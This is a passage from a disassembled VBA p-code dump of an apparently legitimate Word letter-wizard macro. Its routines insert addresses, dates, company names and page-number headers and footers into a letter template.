Val 0x0001 \n' \tSub \n' \tLd fromEdgeDef \n' \tSub \n' \tArgsLd Str 0x0001 \n' \tSt RightDistanceToLeftDistance$ \n' Line #557:\n' \tEndFunc \n' Line #558:\n' Line #559:\n' \tFuncDefn (Private Sub InsertRedSlot(s))\n' \tQuoteRem 0x0020 0x0020 \"DAPFEL, Changed to a MacroButton\"\n' Line #560:\n' \tQuoteRem 0x0018 0x002B \"MUST HAVE EmptyMacro macro in .wiz template\"\n' Line #561:\n' \tLitDI2 0x0001 \n' \tParamNamed FieldCodes \n' \tLd WordBasic \n' \tArgsMemCall ToolsOptionsView 0x0001 \n' Line #562:\n' \tLd kMacroButton$ \n' \tParamNamed Field \n' \tLd WordBasic \n' \tArgsMemCall InsertField 0x0001 \n' Line #563:\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall CharLeft 0x0001 \n' Line #564:\n' \tLd kEmptyMacro$ \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #565:\n' \tLitStr 0x0001 \"[\"\n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #566:\n' \tLd s$ \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #567:\n' \tLitStr 0x0001 \"]\"\n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #568:\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall CharRight 0x0001 \n' Line #569:\n' \tLitDI2 0x0000 \n' \tParamNamed FieldCodes \n' \tLd WordBasic \n' \tArgsMemCall ToolsOptionsView 0x0001 \n' Line #570:\n' \tEndSub \n' Line #571:\n' Line #572:\n' \tFuncDefn (Private Sub SubstituteBananas())\n' Line #573:\n' \tDim \n' \tVarDefn v\n' Line #574:\n' \tDim \n' \tVarDefn letterIndex\n' Line #575:\n' \tDim \n' \tVarDefn ii\n' Line #576:\n' \tArgsCall DoStyleMerge 0x0000 \n' Line #577:\n' \tLitStr 0x0009 \"bkAddress\"\n' \tLd WordBasic \n' \tArgsMemLd ExistingBookmark 0x0001 \n' \tIfBlock \n' Line #578:\n' \tLitStr 0x0009 \"bkAddress\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed If \n' \tLd WordBasic \n' \tArgsMemCall EditBookmark 0x0002 \n' Line #579:\n' \tQuoteRem 0x0000 0x0052 \"If recipient address is same as default address(AT entry) then insert boilerplates\"\n' Line #580:\n' \tLitStr 0x0014 \"textRecipientAddress\"\n' \tLd WordBasic \n' \tArgsMemLd [DlgText$] 0x0001 \n' \tSt v$ \n' Line #581:\n' \tLd v$ \n' \tLd kAddressATEntry$ \n' \tNe \n' \tIfBlock \n' Line #582:\n' \tLd v$ \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #583:\n' \tLd v$ \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #584:\n' \tElseBlock \n' Line #585:\n' \tLd WordBasic \n' \tArgsMemCall EditClear 0x0000 \n' \tQuoteRem 0x0024 0x004C \"not able to replace selected text with empty string. Text remains unchanged.\"\n' Line #586:\n' \tEndIfBlock \n' Line #587:\n' \tElseBlock \n' Line #588:\n' \tLd kRecipient$ \n' \tArgsCall InsertRedSlot 0x0001 \n' Line #589:\n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' Line #590:\n' \tLd kEnterRecipientAddress$ \n' \tArgsCall InsertRedSlot 0x0001 \n' Line #591:\n' \tEndIfBlock \n' Line #592:\n' \tEndIfBlock \n' Line #593:\n' Line #594:\n' \tLitStr 0x0004 \"Date\"\n' \tLd WordBasic \n' \tArgsMemLd ExistingBookmark 0x0001 \n' \tIfBlock \n' Line #595:\n' \tLitStr 0x0004 \"Date\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed If \n' \tLd WordBasic \n' \tArgsMemCall EditBookmark 0x0002 \n' Line #596:\n' \tLd kFormalDateFormat$ \n' \tLd WordBasic \n' \tArgsMemCall InsertDateTime 0x0001 \n' Line #597:\n' \tEndIfBlock \n' Line #598:\n' \tLitStr 0x000F \"bkReturnAddress\"\n' \tLd WordBasic \n' \tArgsMemLd ExistingBookmark 0x0001 \n' \tIfBlock \n' Line #599:\n' \tLitStr 0x000F \"bkReturnAddress\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed If \n' \tLd WordBasic \n' \tArgsMemCall EditBookmark 0x0002 \n' Line #600:\n' \tLd WordBasic \n' \tArgsMemCall WW6_EditClear 0x0000 \n' Line #601:\n' \tLitStr 0x000D \"UseLetterhead\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' Line #602:\n' \tLitStr 0x000F \"bkReturnAddress\"\n' \tLd WordBasic \n' \tArgsMemCall EditBookmark 0x0001 \n' \tQuoteRem 0x0035 0x000B \"Plain Paper\"\n' Line #603:\n' \tElseBlock \n' Line #604:\n' \tLd WordBasic \n' \tArgsMemCall WW6_EditClear 0x0000 \n' \tQuoteRem 0x0024 0x0015 \"Remove Paragraph mark\"\n' Line #605:\n' \tEndIfBlock \n' Line #606:\n' \tEndIfBlock \n' Line #607:\n' Line #608:\n' \tLitStr 0x0009 \"bkCompany\"\n' \tLd WordBasic \n' \tArgsMemLd ExistingBookmark 0x0001 \n' \tIfBlock \n' Line #609:\n' \tLitStr 0x0009 \"bkCompany\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed If \n' \tLd WordBasic \n' \tArgsMemCall EditBookmark 0x0002 \n' Line #610:\n' \tLd WordBasic \n' \tArgsMemCall WW6_EditClear 0x0000 \n' Line #611:\n' Line #612:\n' \tLitStr 0x000D \"UseLetterhead\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' Line #613:\n' \tLitStr 0x0009 \"bkCompany\"\n' \tLd WordBasic \n' \tArgsMemCall EditBookmark 0x0001 \n' \tQuoteRem 0x002F 0x000B \"Plain Paper\"\n' Line #614:\n' \tElseBlock \n' Line #615:\n' \tLd WordBasic \n' \tArgsMemCall WW6_EditClear 0x0000 \n' \tQuoteRem 0x0024 0x0015 \"Remove Paragraph mark\"\n' Line #616:\n' \tEndIfBlock \n' Line #617:\n' \tEndIfBlock \n' Line #618:\n' Line #619:\n' \tLitStr 0x000D \"UseLetterhead\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' Line #620:\n' \tLitStr 0x0009 \"bkCompany\"\n' \tLd WordBasic \n' \tArgsMemLd ExistingBookmark 0x0001 \n' \tIfBlock \n' Line #621:\n' \tLd kStyCmpnyName$ \n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #622:\n' \tLitStr 0x0009 \"bkCompany\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed If \n' \tLd WordBasic \n' \tArgsMemCall EditBookmark 0x0002 \n' Line #623:\n' \tLd kTypeCompanyName$ \n' \tArgsCall InsertRedSlot 0x0001 \n' Line #624:\n' \tEndIfBlock \n' Line #625:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tParen \n' \tIfBlock \n' Line #626:\n' \tLitStr 0x0009 \"cntmpgfx2\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed Insert \n' \tLd WordBasic \n' \tArgsMemCall WW7_EditAutoText 0x0002 \n' Line #627:\n' \tQuoteRem 0x0008 0x009F \"An extra line is introduced with the insertion of AT Entry. Does not affect Resume cover letter and letter to mom, because you do not have \"Company Name\" style\"\n' Line #628:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall CharRight 0x0002 \n' Line #629:\n' \tLd WordBasic \n' \tArgsMemCall WW6_EditClear 0x0000 \n' Line #630:\n' \tElseBlock \n' Line #631:\n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' Line #632:\n' \tEndIfBlock \n' \tQuoteRem 0x000F 0x000A \"Wizstyle=1\"\n' Line #633:\n' Line #634:\n' \tLitStr 0x000F \"bkReturnAddress\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed If \n' \tLd WordBasic \n' \tArgsMemCall EditBookmark 0x0002 \n' Line #635:\n' \tLd kStyRetAddr$ \n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #636:\n' \tArgsCall ParseRetAddress 0x0000 \n' Line #637:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0002 \n' \tNe \n' \tParen \n' \tIfBlock \n' \tQuoteRem 0x0036 0x0018 \" Cntmp or Prof let style\"\n' Line #638:\n' \tStartForVariable \n' \tLd ii \n' \tEndForVariable \n' \tLitDI2 0x0000 \n' \tLitDI2 0x0003 \n' \tFor \n' Line #639:\n' \tLd ii \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tParen \n' \tIfBlock \n' Line #640:\n' \tLd ii \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #641:\n' \tElseBlock \n' Line #642:\n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #643:\n' \tEndIfBlock \n' \tQuoteRem 0x0017 0x000D \"RetAddress...\"\n' Line #644:\n' \tStartForVariable \n' \tLd ii \n' \tEndForVariable \n' \tNextVar \n' Line #645:\n' \tLitDI2 0x0004 \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0004 \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' \tEndIf \n' Line #646:\n' \tElseBlock \n' \tQuoteRem 0x000D 0x000D \"elegant style\"\n' Line #647:\n' \tStartForVariable \n' \tLd ii \n' \tEndForVariable \n' \tLitDI2 0x0000 \n' \tLitDI2 0x0003 \n' \tFor \n' Line #648:\n' \tLd ii \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tParen \n' \tIfBlock \n' Line #649:\n' \tLd ii \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLitStr 0x0004 \" \u00a1E \"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #650:\n' \tElseBlock \n' Line #651:\n' \tQuoteRem 0x0014 0x000A \"Do Nothing\"\n' Line #652:\n' \tEndIfBlock \n' \tQuoteRem 0x0017 0x000D \"RetAddress...\"\n' Line #653:\n' \tStartForVariable \n' \tLd ii \n' \tEndForVariable \n' \tNextVar \n' Line #654:\n' \tLitDI2 0x0004 \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #655:\n' \tLitDI2 0x0004 \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #656:\n' \tElseBlock \n' Line #657:\n' \tLitDI2 0x0003 \n' \tUMi \n' \tLd WordBasic \n' \tArgsMemCall WW6_EditClear 0x0001 \n' \tQuoteRem 0x002B 0x0016 \"get rid of last bullet\"\n' Line #658:\n' \tEndIfBlock \n' Line #659:\n' \tEndIfBlock \n' Line #660:\n' \tEndIfBlock \n' \tQuoteRem 0x000B 0x000A \"LetterHead\"\n' Line #661:\n' Line #662:\n' \tLitStr 0x0006 \"bkName\"\n' \tLd WordBasic \n' \tArgsMemLd ExistingBookmark 0x0001 \n' \tIfBlock \n' Line #663:\n' \tLitStr 0x0006 \"bkName\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed If \n' \tLd WordBasic \n' \tArgsMemCall EditBookmark 0x0002 \n' Line #664:\n' \tLd kName$ \n' \tArgsCall InsertRedSlot 0x0001 \n' Line #665:\n' \tEndIfBlock \n' Line #666:\n' Line #667:\n' \tLitStr 0x0007 \"bkName2\"\n' \tLd WordBasic \n' \tArgsMemLd ExistingBookmark 0x0001 \n' \tIfBlock \n' Line #668:\n' \tLitStr 0x0007 \"bkName2\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed If \n' \tLd WordBasic \n' \tArgsMemCall EditBookmark 0x0002 \n' Line #669:\n' \tLd toui \n' \tMemLd New \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #670:\n' \tLd toui \n' \tMemLd New \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #671:\n' \tElseBlock \n' Line #672:\n' \tLd kName$ \n' \tArgsCall InsertRedSlot 0x0001 \n' Line #673:\n' \tEndIfBlock \n' Line #674:\n' \tEndIfBlock \n' Line #675:\n' \tLabel LDone \n' Line #676:\n' \tEndSub \n' Line #677:\n' Line #678:\n' Line #679:\n' Line #680:\n' Line #681:\n' Line #682:\n' \tFuncDefn (Private Sub SetAddress(nm))\n' Line #683:\n' \tDim \n' \tVarDefn AddressText\n' Line #684:\n' \tDim \n' \tVarDefn ix\n' Line #685:\n' \tDim \n' \tVarDefn iy\n' Line #686:\n' \tDim \n' \tVarDefn Ltemp\n' Line #687:\n' \tDim \n' \tVarDefn Rtemp\n' Line #688:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError ErrorSetAddress \n' Line #689:\n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x0000 \"\"\n' \tLitDI2 0x0000 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0000 \n' \tLitDI2 0x0000 \n' \tLd nm \n' \tLitDI2 0x0001 \n' \tSub \n' \tParen \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [GetAddress$] 0x0008 \n' \tSt AddressText$ \n' Line #690:\n' \tLd AddressText$ \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo SetAddressContinue \n' \tEndIf \n' Line #691:\n' \tLitDI2 0x0001 \n' \tLd AddressText$ \n' \tLitDI2 0x000B \n' \tArgsLd Chr 0x0001 \n' \tFnInStr3 \n' \tSt ix \n' Line #692:\n' \tLd ix \n' \tLitDI2 0x0000 \n' \tNe \n' \tWhile \n' Line #693:\n' \tLd AddressText$ \n' \tFnLen \n' \tSt iy \n' Line #694:\n' \tLd AddressText$ \n' \tLd ix \n' \tLitDI2 0x0001 \n' \tSub \n' \tParen \n' \tLd WordBasic \n' \tArgsMemLd [Left$] 0x0002 \n' \tSt Ltemp$ \n' Line #695:\n' \tLd AddressText$ \n' \tLd iy \n' \tLd ix \n' \tSub \n' \tParen \n' \tLd WordBasic \n' \tArgsMemLd [Right$] 0x0002 \n' \tSt Rtemp$ \n' Line #696:\n' \tLd Ltemp$ \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd Rtemp$ \n' \tAdd \n' \tSt AddressText$ \n' Line #697:\n' \tLitDI2 0x0001 \n' \tLd AddressText$ \n' \tLitDI2 0x000B \n' \tArgsLd Chr 0x0001 \n' \tFnInStr3 \n' \tSt ix \n' Line #698:\n' \tWend \n' Line #699:\n' \tLd AddressText$ \n' \tFnLen \n' \tSt iy \n' Line #700:\n' \tLd iy \n' \tLd AddressText$ \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tFnInStr3 \n' \tSt ix \n' Line #701:\n' \tLd ix \n' \tLd iy \n' \tEq \n' \tWhile \n' Line #702:\n' \tLd AddressText$ \n' \tLd iy \n' \tLitDI2 0x0001 \n' \tSub \n' \tParen \n' \tLd WordBasic \n' \tArgsMemLd [Left$] 0x0002 \n' \tSt AddressText$ \n' Line #703:\n' \tLd AddressText$ \n' \tFnLen \n' \tSt iy \n' Line #704:\n' \tLd iy \n' \tLd AddressText$ \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tFnInStr3 \n' \tSt ix \n' Line #705:\n' \tWend \n' Line #706:\n' \tLd nm \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' Line #707:\n' \tLitStr 0x0014 \"textRecipientAddress\"\n' \tLd AddressText$ \n' \tLd WordBasic \n' \tArgsMemCall DlgText 0x0002 \n' Line #708:\n' \tLd nm \n' \tLitDI2 0x0002 \n' \tEq \n' \tElseIfBlock \n' Line #709:\n' \tLitStr 0x0011 \"textReturnAddress\"\n' \tLd AddressText$ \n' \tLd WordBasic \n' \tArgsMemCall DlgText 0x0002 \n' Line #710:\n' \tElseBlock \n' Line #711:\n' \tQuoteRem 0x0008 0x0010 \"shouldn't happen\"\n' Line #712:\n' \tEndIfBlock \n' \tQuoteRem 0x000B 0x0002 \"nm\"\n' Line #713:\n' \tGoTo SetAddressContinue \n' Line #714:\n' \tLabel ErrorSetAddress \n' Line #715:\n' \tQuoteRem 0x0004 0x0056 \"Only after getting the first MAPI load error, CommandValid (\"InsertAddress\") returns 0\"\n' Line #716:\n' \tLd nm \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' \tQuoteRem 0x0013 0x0030 \"If error is due to MAPI loading, disable buttons\"\n' Line #717:\n' \tLitDI2 0x002B \n' \tLd WordBasic \n' \tArgsMemCall DlgFocus 0x0001 \n' Line #718:\n' \tLitDI2 0x002E \n' \tLitDI2 0x0000 \n' \tLd kInsertAddress$ \n' \tLd WordBasic \n' \tArgsMemLd CommandValid 0x0001 \n' \tSub \n' \tLd WordBasic \n' \tArgsMemCall DlgEnable 0x0002 \n' Line #719:\n' \tLitDI2 0x002F \n' \tLitDI2 0x0000 \n' \tLd kInsertAddress$ \n' \tLd WordBasic \n' \tArgsMemLd CommandValid 0x0001 \n' \tSub \n' \tLd WordBasic \n' \tArgsMemCall DlgEnable 0x0002 \n' Line #720:\n' \tElseBlock \n' Line #721:\n' \tLitDI2 0x002D \n' \tLd WordBasic \n' \tArgsMemCall DlgFocus 0x0001 \n' Line #722:\n' \tLitDI2 0x002F \n' \tLitDI2 0x0000 \n' \tLd kInsertAddress$ \n' \tLd WordBasic \n' \tArgsMemLd CommandValid 0x0001 \n' \tSub \n' \tLd WordBasic \n' \tArgsMemCall DlgEnable 0x0002 \n' Line #723:\n' \tLitDI2 0x002E \n' \tLitDI2 0x0000 \n' \tLd kInsertAddress$ \n' \tLd WordBasic \n' \tArgsMemLd CommandValid 0x0001 \n' \tSub \n' \tLd WordBasic \n' \tArgsMemCall DlgEnable 0x0002 \n' Line #724:\n' \tEndIfBlock \n' Line #725:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError (GoTo 0) \n' Line #726:\n' \tLabel SetAddressContinue \n' Line #727:\n' \tEndSub \n' \tQuoteRem 0x0008 0x000A \"SetAddress\"\n' Line #728:\n' Line #729:\n' \tFuncDefn (Private Function RmTrailingLFs(tString))\n' \tQuoteRem 0x002A 0x001F \"nukes extra returns in a string\"\n' Line #730:\n' \tDim \n' \tVarDefn iy\n' Line #731:\n' \tDim \n' \tVarDefn ix\n' Line #732:\n' \tLd tString$ \n' \tFnLen \n' \tSt iy \n' Line #733:\n' \tLd iy \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo EndOfRmTrailingLFs \n' \tEndIf \n' Line #734:\n' \tLd iy \n' \tLd tString$ \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tFnInStr3 \n' \tSt ix \n' Line #735:\n' \tLd ix \n' \tLd iy \n' \tEq \n' \tWhile \n' Line #736:\n' \tLd tString$ \n' \tLd iy \n' \tLitDI2 0x0001 \n' \tSub \n' \tParen \n' \tLd WordBasic \n' \tArgsMemLd [Left$] 0x0002 \n' \tSt tString$ \n' Line #737:\n' \tLd tString$ \n' \tFnLen \n' \tSt iy \n' Line #738:\n' \tLd iy \n' \tLd tString$ \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tFnInStr3 \n' \tSt ix \n' Line #739:\n' \tWend \n' Line #740:\n' \tLabel EndOfRmTrailingLFs \n' Line #741:\n' \tLd tString$ \n' \tSt RmTrailingLFs$ \n' Line #742:\n' \tEndFunc \n' Line #743:\n' Line #744:\n' \tFuncDefn (Private Sub TwoPageHack(num))\n' \tQuoteRem 0x001D 0x0021 \"Hacks in a 2nd page header/footer\"\n' Line #745:\n' \tLd WordBasic \n' \tArgsMemCall WW7_InsertPageBreak 0x0000 \n' Line #746:\n' \tLd WordBasic \n' \tArgsMemCall EndOfDocument 0x0000 \n' Line #747:\n' \tLitDI2 0x0001 \n' \tParamNamed DifferentFirstPage \n' \tLd WordBasic \n' \tArgsMemCall FilePageSetup 0x0001 \n' Line #748:\n' \tLd num \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' Line #749:\n' \tLd WordBasic \n' \tArgsMemCall ViewHeader 0x0000 \n' Line #750:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0002 \n' \tNe \n' \tParen \n' \tIfBlock \n' Line #751:\n' \tLitDI2 0x0009 \n' \tArgsLd Chr 0x0001 \n' \tLitDI2 0x0009 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #752:\n' \tElseBlock \n' Line #753:\n' \tLitDI2 0x0009 \n' \tArgsLd Chr 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #754:\n' \tEndIfBlock \n' Line #755:\n' \tLd kFormalDateFormat$ \n' \tLd WordBasic \n' \tArgsMemCall InsertDateTime 0x0001 \n' Line #756:\n' \tLd WordBasic \n' \tArgsMemCall ViewNormal 0x0000 \n' Line #757:\n' \tEndIfBlock \n' Line #758:\n' \tLd num \n' \tLitDI2 0x0002 \n' \tEq \n' \tIfBlock \n' Line #759:\n' \tLd WordBasic \n' \tArgsMemCall ViewFooter 0x0000 \n' Line #760:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0002 \n' \tNe \n' \tParen \n' \tIfBlock \n' Line #761:\n' \tLitDI2 0x0009 \n' \tArgsLd Chr 0x0001 \n' \tLitDI2 0x0009 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #762:\n' \tLd WordBasic \n' \tArgsMemCall InsertPageField 0x0000 \n' Line #763:\n' \tElseBlock \n' Line #764:\n' \tLitDI2 0x0009 \n' \tArgsLd Chr 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #765:\n' \tLitDI2 0x0096 \n' \tArgsLd Chr 0x0001 \n' \tLitStr 0x0001 \" \"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #766:\n' \tLd WordBasic \n' \tArgsMemCall InsertPageField 0x0000 \n' Line #767:\n' \tLitStr 0x0001 \" \"\n' \tLitDI2 0x0096 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #768:\n' \tEndIfBlock \n' Line #769:\n' \tLd WordBasic \n' \tArgsMemCall ViewNormal 0x0000 \n' Line #770:\n' \tEndIfBlock \n' Line #771:\n' \tLd WordBasic \n' \tArgsMemCall EditSelectAll 0x0000 \n' Line #772:\n' \tLd WordBasic \n' \tArgsMemCall WW6_EditClear 0x0000 \n' Line #773:\n' \tEndSub \n' Line #774:\n' Line #775:\n' \tFuncDefn (Private Sub CreateLetter())\n' Line #776:\n' \tDim \n' \tVarDefn recpAddress\n' Line #777:\n' \tDim \n' \tVarDefn returnAddress\n' Line #778:\n' \tDim \n' \tVarDefn T\n' Line #779:\n' \tDim \n' \tVarDefn DateTabPlace\n' Line #780:\n' \tDim \n' \tVarDefn ii\n' Line #781:\n' \tLd kCreatingDoc$ \n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' Line #782:\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall WaitCursor 0x0001 \n' Line #783:\n' \tQuoteRem 0x0004 0x0032 \" branch on letter type : shrinkwrapped or original\"\n' Line #784:\n' \tLitStr 0x0014 \"textRecipientAddress\"\n' \tLd WordBasic \n' \tArgsMemLd [DlgText$] 0x0001 \n' \tSt recpAddress$ \n' Line #785:\n' \tLd recpAddress$ \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0014 \"textRecipientAddress\"\n' \tLd recpAddress$ \n' \tArgsLd RmTrailingLFs$ 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall DlgText 0x0002 \n' \tEndIf \n' Line #786:\n' \tLitStr 0x0011 \"textReturnAddress\"\n' \tLd WordBasic \n' \tArgsMemLd [DlgText$] 0x0001 \n' \tSt returnAddress$ \n' Line #787:\n' \tLd returnAddress$ \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0011 \"textReturnAddress\"\n' \tLd returnAddress$ \n' \tArgsLd RmTrailingLFs$ 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall DlgText 0x0002 \n' \tEndIf \n' Line #788:\n' Line #789:\n' \tRem 0x0035 \" ****************************************************\"\n' Line #790:\n' Line #791:\n' \tLitStr 0x0009 \"chkloDate\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0000 \n' \tNe \n' \tIfBlock \n' Line #792:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall TwoPageHack 0x0001 \n' \tQuoteRem 0x0018 0x0021 \"Hacks in a 2nd page header/footer\"\n' Line #793:\n' \tEndIfBlock \n' Line #794:\n' \tLitStr 0x0009 \"chkloPage\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0000 \n' \tNe \n' \tIfBlock \n' Line #795:\n' \tLitDI2 0x0002 \n' \tParen \n' \tArgsCall TwoPageHack 0x0001 \n' Line #796:\n' \tLd WordBasic \n' \tArgsMemCall ViewFooter 0x0000 \n' Line #797:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tSelectCase \n' Line #798:\n' \tLitDI2 0x0002 \n' \tCase \n' \tCaseDone \n' Line #799:\n' \tLitDI2 0x0009 \n' \tArgsLd Chr 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #800:\n' \tLitDI2 0x0096 \n' \tArgsLd Chr 0x0001 \n' \tLitStr 0x0001 \" \"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #801:\n' \tLd WordBasic \n' \tArgsMemCall InsertPageField 0x0000 \n' Line #802:\n' \tLitStr 0x0001 \" \"\n' \tLitDI2 0x0096 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #803:\n' \tLitDI2 0x0001 \n' \tCase \n' \tCaseDone \n' Line #804:\n' \tLitDI2 0x0009 \n' \tArgsLd Chr 0x0001 \n' \tLitDI2 0x0009 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #805:\n' \tLd WordBasic \n' \tArgsMemCall InsertPageField 0x0000 \n' Line #806:\n' \tLitDI2 0x0000 \n' \tCase \n' \tCaseDone \n' Line #807:\n' \tLd kFntWndngs$ \n' \tLd WordBasic \n' \tArgsMemCall Font 0x0001 \n' Line #808:\n' \tLd kDfltPageNum$ \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #809:\n' \tLd kFntArial$ \n' \tLd WordBasic \n' \tArgsMemCall Font 0x0001 \n' Line #810:\n' \tLd kPage$ \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #811:\n' \tLd WordBasic \n' \tArgsMemCall InsertPageField 0x0000 \n' Line #812:\n' \tEndSelect \n' Line #813:\n' \tLd WordBasic \n' \tArgsMemCall ViewNormal 0x0000 \n' Line #814:\n' \tEndIfBlock \n' Line #815:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tParen \n' \tLitStr 0x0009 \"chkloPage\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0000 \n' \tEq \n' \tParen \n' \tAnd \n' \tIfBlock \n' Line #816:\n' \tLd WordBasic \n' \tArgsMemCall ViewFooter 0x0000 \n' Line #817:\n' \tLitStr 0x0001 \" \"\n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #818:\n' \tLd WordBasic \n' \tArgsMemCall ViewNormal 0x0000 \n' Line #819:\n' \tEndIfBlock \n' Line #820:\n' \tQuoteRem 0x0004 0x0022 \" this is code for original letters\"\n' Line #821:\n' \tLd WordBasic \n' \tArgsMemCall EditSelectAll 0x0000 